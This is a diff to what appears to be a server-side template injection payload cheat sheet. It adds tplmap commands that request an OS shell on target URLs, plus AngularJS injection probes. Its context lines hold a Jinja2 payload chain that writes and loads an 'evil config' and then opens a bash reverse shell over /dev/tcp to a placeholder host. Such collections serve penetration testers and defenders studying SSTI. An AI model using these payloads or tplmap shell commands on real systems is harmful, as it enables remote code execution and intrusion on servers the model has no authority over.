@@ -5,9 +5,10 @@
 Recommended tool: [Tplmap](https://github.com/epinna/tplmap)
 e.g:
 ```
-./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
+python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell 
+python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
+python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade 
 ```
-
 
 ## Ruby
 ### Basic injection
@@ -21,8 +22,8 @@ e.g:
 ```
 
 
-## Java
-### Basic injection
+## Java 
+### Basic injection
 ```java
 ${7*7}
 ${{7*7}}
@@ -172,6 +173,13 @@ Inject this template
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
 {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
 {{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
+```
+
+## AngularJS
+### Basic injection
+```javascript
+$eval('1+1')
+{{1+1}}
 ```
 
 ## Thanks to
